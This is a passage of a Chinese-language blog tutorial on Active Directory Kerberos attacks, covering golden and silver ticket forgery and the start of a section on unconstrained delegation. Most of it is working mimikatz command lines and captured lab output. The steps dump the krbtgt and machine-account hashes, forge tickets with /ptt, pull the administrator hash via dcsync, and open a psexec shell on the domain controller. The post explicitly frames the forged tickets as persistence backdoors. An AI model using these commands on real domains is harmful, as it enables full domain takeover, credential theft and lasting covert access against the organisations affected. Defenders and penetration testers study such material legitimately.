<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不在域中的机器，需要在hosts文件中加入这个域的域控的解析，如：<span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> tt.com</span><br><span class="line">hash也可以使用rc4/aes256，推荐使用aes256，rc4也是ntlm hash</span><br><span class="line">对于<span class="number">8</span>.<span class="number">1</span>/<span class="number">2012</span>r2，安装补丁kb2871997的Win <span class="number">7</span>/<span class="number">2008</span>r2/<span class="number">8</span>/<span class="number">2012</span>，可以使用AES keys代替NT hash</span><br><span class="line">mimikatz &quot;kerberos::golden /domain:域名 /user:任意域用户 /sid:域SID /krbtgt:NTLM_HASH /ptt&quot; <span class="keyword">exit</span></span><br><span class="line">mimikatz &quot;kerberos::golden /domain:域名 /user:任意域用户 /sid:域SID /rc4:NTLM_HASH /ptt&quot; <span class="keyword">exit</span></span><br><span class="line">mimikatz &quot;kerberos::golden /domain:域名 /user:任意域用户 /sid:域SID /aes256:NTLM_HASH /ptt&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用票据访问其他域机器，还可以使用mimikatz直接同步导出指定用户的hash</span><br><span class="line"><span class="built_in">dir</span> \\域机器名.域名\c$</span><br><span class="line">psexec \\域机器名.域名 <span class="built_in">cmd</span></span><br><span class="line">mimikatz &quot;lsadump::dcsync /domain:tt.com /user:administrator&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure></li>
<li><p>实践</p>
</li>
</ul>
<p>域控上：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">administrator</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> <span class="title">privilege</span>::<span class="title">debug</span> &quot;<span class="title">lsadump</span>::<span class="title">lsa</span> /<span class="title">inject</span> /<span class="title">user:krbtgt</span>&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">(<span class="title">commandline</span>) # <span class="title">privilege</span>::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> \&#x27;20\&#x27; <span class="title">OK</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">(<span class="title">commandline</span>) # <span class="title">lsadump</span>::<span class="title">lsa</span> /<span class="title">inject</span> /<span class="title">user:krbtgt</span></span></span><br><span class="line"><span class="function"><span class="title">Domain</span> : <span class="title">TT</span> / <span class="title">S</span>-1-5-21-1881962959-1052950955-462027270</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">RID</span>  : 000001<span class="title">f6</span> (502)</span></span><br><span class="line"><span class="function"><span class="title">User</span> : <span class="title">krbtgt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> * <span class="title">Primary</span></span></span><br><span class="line"><span class="function">    <span class="title">NTLM</span> : <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br><span class="line"><span class="function">    <span class="title">LM</span>   :</span></span><br><span class="line"><span class="function">  <span class="title">Hash</span> <span class="title">NTLM</span>: <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br><span class="line"><span class="function">    <span class="title">ntlm</span>- 0: <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br><span class="line"><span class="function">    <span class="title">lm</span>  - 0: 434028<span class="title">f38350b6c20235e2f900a1026d</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> * <span class="title">Kerberos</span>-<span class="title">Newer</span>-<span class="title">Keys</span></span></span><br><span class="line"><span class="function">    <span class="title">Default</span> <span class="title">Salt</span> : <span class="title">TT.COMkrbtgt</span></span></span><br><span class="line"><span class="function">    <span class="title">Default</span> <span class="title">Iterations</span> : 4096</span></span><br><span class="line"><span class="function">    <span class="title">Credentials</span></span></span><br><span class="line"><span class="function">      <span class="title">aes256_hmac</span>       (4096) : 464<span class="title">db31a5f9e55bd7b306d672eae7d39e79820079dd5244873756978b24b5e81</span></span></span><br><span class="line"><span class="function">      <span class="title">aes128_hmac</span>       (4096) : 236<span class="title">e2daf395726846e9b373dc97d6707</span></span></span><br><span class="line"><span class="function">      <span class="title">des_cbc_md5</span>       (4096) : 102<span class="title">ae391730140f2</span></span></span><br><span class="line"><span class="function">      <span class="title">rc4_plain</span>         (4096) : <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">administrator</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> <span class="title">privilege</span>::<span class="title">debug</span> <span class="title">sekurlsa</span>::<span class="title">krbtgt</span> <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">(<span class="title">commandline</span>) # <span class="title">privilege</span>::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> \&#x27;20\&#x27; <span class="title">OK</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">(<span class="title">commandline</span>) # <span class="title">sekurlsa</span>::<span class="title">krbtgt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Current</span> <span class="title">krbtgt</span>: 7 <span class="title">credentials</span></span></span><br><span class="line"><span class="function">         * <span class="title">rc4_hmac_nt</span>       : <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br><span class="line"><span class="function">         * <span class="title">rc4_hmac_old</span>      : <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br><span class="line"><span class="function">         * <span class="title">rc4_md4</span>           : <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br><span class="line"><span class="function">         * <span class="title">aes256_hmac</span>       : 464<span class="title">db31a5f9e55bd7b306d672eae7d39e79820079dd5244873756978b24b5e81</span></span></span><br><span class="line"><span class="function">         * <span class="title">aes128_hmac</span>       : 236<span class="title">e2daf395726846e9b373dc97d6707</span></span></span><br><span class="line"><span class="function">         * <span class="title">des_cbc_md5</span>       : 102<span class="title">ae391730140f2</span></span></span><br><span class="line"><span class="function">         * <span class="title">rc4_plain</span>         : <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br></pre></td></tr></table></figure>

<p>攻击机上：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> &quot;<span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">user:administrator</span> /<span class="title">sid:S</span>-1-5-21-1881962959-1052950955-462027270  /<span class="title">aes256</span>:464<span class="title">db31a5f9e55bd7b306d672eae7d39e79820079dd5244873756978b24b5e81</span> /<span class="title">ptt</span>&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">user:administrator</span> /<span class="title">sid:S</span>-1-5-21-1881962959-1052950955-462027270  /<span class="title">aes256</span>:464<span class="title">db31a5f9e55bd7b306d672eae7d39e79820079dd5244873756978b24b5e81</span> /<span class="title">ptt</span></span></span><br><span class="line"><span class="function"><span class="title">User</span>      : <span class="title">administrator</span></span></span><br><span class="line"><span class="function"><span class="title">Domain</span>    : <span class="title">tt.com</span> (<span class="title">TT</span>)</span></span><br><span class="line"><span class="function"><span class="title">SID</span>       : <span class="title">S</span>-1-5-21-1881962959-1052950955-462027270</span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">Id</span>   : 500</span></span><br><span class="line"><span class="function"><span class="title">Groups</span> <span class="title">Id</span> : *513 512 520 518 519</span></span><br><span class="line"><span class="function"><span class="title">ServiceKey</span>: 464<span class="title">db31a5f9e55bd7b306d672eae7d39e79820079dd5244873756978b24b5e81</span> - <span class="title">aes256_hmac</span></span></span><br><span class="line"><span class="function"><span class="title">Lifetime</span>  : 2020/8/29 16:08:30 ; 2030/8/27 16:08:30 ; 2030/8/27 16:08:30</span></span><br><span class="line"><span class="function">-&gt; <span class="title">Ticket</span> : ** <span class="title">Pass</span> <span class="title">The</span> <span class="title">Ticket</span> **</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> * <span class="title">PAC</span> <span class="title">generated</span></span></span><br><span class="line"><span class="function"> * <span class="title">PAC</span> <span class="title">signed</span></span></span><br><span class="line"><span class="function"> * <span class="title">EncTicketPart</span> <span class="title">generated</span></span></span><br><span class="line"><span class="function"> * <span class="title">EncTicketPart</span> <span class="title">encrypted</span></span></span><br><span class="line"><span class="function"> * <span class="title">KrbCred</span> <span class="title">generated</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Golden</span> <span class="title">ticket</span> <span class="title">for</span> &#x27;<span class="title">administrator</span> @ <span class="title">tt.com</span>&#x27; <span class="title">successfully</span> <span class="title">submitted</span> <span class="title">for</span> <span class="title">current</span> <span class="title">session</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">dir</span> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$ 的目录</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">2009/07/14  11:20    &lt;<span class="title">DIR</span>&gt;          <span class="title">PerfLogs</span></span></span><br><span class="line"><span class="function">2020/08/28  21:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function">2020/08/28  21:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)</span></span><br><span class="line"><span class="function">2020/08/28  21:54    &lt;<span class="title">DIR</span>&gt;          <span class="title">Users</span></span></span><br><span class="line"><span class="function">2020/08/29  16:06    &lt;<span class="title">DIR</span>&gt;          <span class="title">Windows</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> &quot;<span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">user:administrator</span>&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">user:administrator</span></span></span><br><span class="line"><span class="function">[<span class="title">DC</span>] &#x27;<span class="title">tt.com</span>&#x27; <span class="title">will</span> <span class="title">be</span> <span class="title">the</span> <span class="title">domain</span></span></span><br><span class="line"><span class="function">[<span class="title">DC</span>] &#x27;<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>&#x27; <span class="title">will</span> <span class="title">be</span> <span class="title">the</span> <span class="title">DC</span> <span class="title">server</span></span></span><br><span class="line"><span class="function">[<span class="title">DC</span>] &#x27;<span class="title">administrator</span>&#x27; <span class="title">will</span> <span class="title">be</span> <span class="title">the</span> <span class="title">user</span> <span class="title">account</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Object</span> <span class="title">RDN</span>           : <span class="title">Administrator</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">** <span class="title">SAM</span> <span class="title">ACCOUNT</span> **</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SAM</span> <span class="title">Username</span>         : <span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">Account</span> <span class="title">Type</span>         : 30000000 ( <span class="title">USER_OBJECT</span> )</span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">Account</span> <span class="title">Control</span> : 00000200 ( <span class="title">NORMAL_ACCOUNT</span> )</span></span><br><span class="line"><span class="function"><span class="title">Account</span> <span class="title">expiration</span>   : 1601/1/1 8:00:00</span></span><br><span class="line"><span class="function"><span class="title">Password</span> <span class="title">last</span> <span class="title">change</span> : 2020/8/28 21:26:05</span></span><br><span class="line"><span class="function"><span class="title">Object</span> <span class="title">Security</span> <span class="title">ID</span>   : <span class="title">S</span>-1-5-21-1881962959-1052950955-462027270-500</span></span><br><span class="line"><span class="function"><span class="title">Object</span> <span class="title">Relative</span> <span class="title">ID</span>   : 500</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Credentials</span>:</span></span><br><span class="line"><span class="function">  <span class="title">Hash</span> <span class="title">NTLM</span>: 30<span class="title">a96699356033b84283b8918a895d67</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">psexec</span> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span> <span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Windows</span> [版本 6.1.7601]</span></span><br><span class="line"><span class="function">版权所有 (<span class="title">c</span>) 2009 <span class="title">Microsoft</span> <span class="title">Corporation</span>。保留所有权利。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">tt</span>\<span class="title">administrator</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">ipconfig</span></span></span><br><span class="line"><span class="function"><span class="title">Windows</span> <span class="title">IP</span> 配置</span></span><br><span class="line"><span class="function">以太网适配器 本地连接:</span></span><br><span class="line"><span class="function">   连接特定的 <span class="title">DNS</span> 后缀 . . . . . . . :</span></span><br><span class="line"><span class="function">   本地链接 <span class="title">IPv6</span> 地址. . . . . . . . : <span class="title">fe80</span>::9187:2<span class="title">d65:add</span>:476<span class="title">e</span>%11</span></span><br><span class="line"><span class="function">   <span class="title">IPv4</span> 地址 . . . . . . . . . . . . : 192.168.19.8</span></span><br><span class="line"><span class="function">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span></span><br><span class="line"><span class="function">   默认网关. . . . . . . . . . . . . : 192.168.19.2</span></span><br></pre></td></tr></table></figure>



<h3 id="黄金票据-by-ticket"><a href="#黄金票据-by-ticket" class="headerlink" title="黄金票据(by ticket)"></a>黄金票据(by ticket)</h3><p>非约束委派中提到了，后门类型。给某个账号添加krbtgt/domain.com的委派，从而拥有krbtgt服务的权限。</p>
<p>而krbtgt服务的权限可以操作域控。参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2931#toc-3">https://xz.aliyun.com/t/2931#toc-3</a></p>
<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><ul>
<li><p><strong>注意</strong></p>
<p>生成可以控制指定计算机的票据，作为持久化后门利用</p>
<p>可以在非域机器上使用，攻击机使用Win7</p>
<p>访问资源时，必须使用计算机的域名进行访问，不能使用IP</p>
<p>通过代理访问内网，则把主机域名的解析写入本地hosts文件</p>
</li>
<li><p><strong>条件</strong></p>
<p>机器hash</p>
<p>/sid 域ID</p>
<p>/service参数不同，拥有的权限不同</p>
<p>/admin参数的用户名不能是存在的</p>
<table>
<thead>
<tr>
<th align="left">服务类型</th>
<th align="left">白银票据对应的服务名</th>
</tr>
</thead>
<tbody><tr>
<td align="left">WMI</td>
<td align="left">HOST/RPCSS</td>
</tr>
<tr>
<td align="left">PowerShell Remoting</td>
<td align="left">HOST/HOST</td>
</tr>
<tr>
<td align="left">WinRM</td>
<td align="left">HOST/HTTP</td>
</tr>
<tr>
<td align="left">Scheduled Tasks</td>
<td align="left">HOST</td>
</tr>
<tr>
<td align="left">Windows File Share (CIFS)</td>
<td align="left">CIFS</td>
</tr>
<tr>
<td align="left">LDAP operations including Mimikatz DCSync</td>
<td align="left">LDAP</td>
</tr>
<tr>
<td align="left">Windows Remote Server Administration Tools</td>
<td align="left">RPCSS/LDAP/CIFS</td>
</tr>
</tbody></table>
</li>
<li><p><strong>操作</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">抓hash，这里要用到的是机器名$的hash</span><br><span class="line">mimikatz log privilege::debug sekurlsa::logonpasswords <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">mimikatz &quot;kerberos::golden /domain:tt.com /admin:NoThisUser /sid:S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">1881962959</span>-<span class="number">1052950955</span>-<span class="number">462027270</span>  /rc4:f24f37620197dfa92d0c272a6835434d /target:WIN-J341S97EGGH.tt.com /service:CIFS /ptt&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用票据访问其他域机器，还可以使用mimikatz直接同步导出指定用户的hash</span><br><span class="line"><span class="built_in">dir</span> \\域机器名.域名\c$</span><br><span class="line">psexec \\域机器名.域名 <span class="built_in">cmd</span></span><br><span class="line">mimikatz &quot;lsadump::dcsync /domain:tt.com /user:administrator&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure></li>
<li><p>实践</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">48001</span> (<span class="number">00000000</span>:<span class="number">0000</span>bb81)</span><br><span class="line">Session           : UndefinedLogonType from <span class="number">0</span></span><br><span class="line">User Name         : (null)Logon <span class="built_in">Time</span>        : <span class="number">2020</span>/<span class="number">8</span>/<span class="number">28</span> <span class="number">21</span>:<span class="number">42</span>:<span class="number">44</span></span><br><span class="line">SID               :</span><br><span class="line">        msv :</span><br><span class="line">         [<span class="number">00000003</span>] Primary</span><br><span class="line">         * Username : WIN-J341S97EGGH$</span><br><span class="line">         * Domain   : TT</span><br><span class="line">         * NTLM     : f24f37620197dfa92d0c272a6835434d</span><br><span class="line">         * SHA1     : <span class="number">0315</span>eca3a67b73e2bf237e819152dfc883a8ea34</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> &quot;<span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">admin:NoThisUser</span> /<span class="title">sid:S</span>-1-5-21-1881962959-1052</span></span><br><span class="line"><span class="function">950955-462027270  /<span class="title">rc4:f24f37620197dfa92d0c272a6835434d</span> /<span class="title">target:WIN</span>-<span class="title">J341S97EGGH.tt.com</span> /<span class="title">service:CIFS</span> /<span class="title">ptt</span>&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">admin:NoThisUser</span> /<span class="title">sid:S</span>-1-5-21-1881962959-1052950955-4</span></span><br><span class="line"><span class="function">62027270  /<span class="title">rc4:f24f37620197dfa92d0c272a6835434d</span> /<span class="title">target:WIN</span>-<span class="title">J341S97EGGH.tt.com</span> /<span class="title">service:CIFS</span> /<span class="title">ptt</span></span></span><br><span class="line"><span class="function"><span class="title">User</span>      : <span class="title">NoThisUser</span></span></span><br><span class="line"><span class="function"><span class="title">Domain</span>    : <span class="title">tt.com</span> (<span class="title">TT</span>)</span></span><br><span class="line"><span class="function"><span class="title">SID</span>       : <span class="title">S</span>-1-5-21-1881962959-1052950955-462027270</span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">Id</span>   : 500</span></span><br><span class="line"><span class="function"><span class="title">Groups</span> <span class="title">Id</span> : *513 512 520 518 519</span></span><br><span class="line"><span class="function"><span class="title">ServiceKey</span>: <span class="title">f24f37620197dfa92d0c272a6835434d</span> - <span class="title">rc4_hmac_nt</span></span></span><br><span class="line"><span class="function"><span class="title">Service</span>   : <span class="title">CIFS</span></span></span><br><span class="line"><span class="function"><span class="title">Target</span>    : <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span></span></span><br><span class="line"><span class="function"><span class="title">Lifetime</span>  : 2020/8/29 16:50:45 ; 2030/8/27 16:50:45 ; 2030/8/27 16:50:45</span></span><br><span class="line"><span class="function">-&gt; <span class="title">Ticket</span> : ** <span class="title">Pass</span> <span class="title">The</span> <span class="title">Ticket</span> **</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> * <span class="title">PAC</span> <span class="title">generated</span></span></span><br><span class="line"><span class="function"> * <span class="title">PAC</span> <span class="title">signed</span></span></span><br><span class="line"><span class="function"> * <span class="title">EncTicketPart</span> <span class="title">generated</span></span></span><br><span class="line"><span class="function"> * <span class="title">EncTicketPart</span> <span class="title">encrypted</span></span></span><br><span class="line"><span class="function"> * <span class="title">KrbCred</span> <span class="title">generated</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Golden</span> <span class="title">ticket</span> <span class="title">for</span> &#x27;<span class="title">NoThisUser</span> @ <span class="title">tt.com</span>&#x27; <span class="title">successfully</span> <span class="title">submitted</span> <span class="title">for</span> <span class="title">current</span> <span class="title">session</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">exit</span></span></span><br><span class="line"><span class="function"><span class="title">Bye</span>!</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">dir</span> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$</span></span><br><span class="line"><span class="function"> 驱动器 \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$ 中的卷没有标签。</span></span><br><span class="line"><span class="function"> 卷的序列号是 7<span class="title">E13</span>-549<span class="title">E</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$ 的目录</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">2009/07/14  11:20    &lt;<span class="title">DIR</span>&gt;          <span class="title">PerfLogs</span></span></span><br><span class="line"><span class="function">2020/08/28  21:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function">2020/08/28  21:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)</span></span><br><span class="line"><span class="function">2020/08/28  21:54    &lt;<span class="title">DIR</span>&gt;          <span class="title">Users</span></span></span><br><span class="line"><span class="function">2020/08/29  16:14    &lt;<span class="title">DIR</span>&gt;          <span class="title">Windows</span></span></span><br><span class="line"><span class="function">               0 个文件              0 字节</span></span><br><span class="line"><span class="function">               5 个目录 30,553,542,656 可用字节</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><ul>
<li><p><strong>效果</strong></p>
<p>只有服务或者计算机才能设置非约束委派</p>
<p>当域用户登录具有非约束委派权限的计算机后，票据会保存在对应的计算机上，从而可以导出缓存票据使用</p>
<p>有域计算机的权限后直接导出，看当前有哪些票据就行了。不用非得挨个去找有非约束委派权限的计算机，因为找到了还要上去提权才能导出票据，再看有哪些权限的票据。这个直接用qs的-q就行了的。</p>
</li>
<li><p><strong>条件</strong></p>
<p>普通域账号密码或域用户权限</p>
</li>
<li><p><strong>操作</strong></p>
</li>
</ul>
<p>先找到哪些计算机或服务具有非约束委派权限</p>
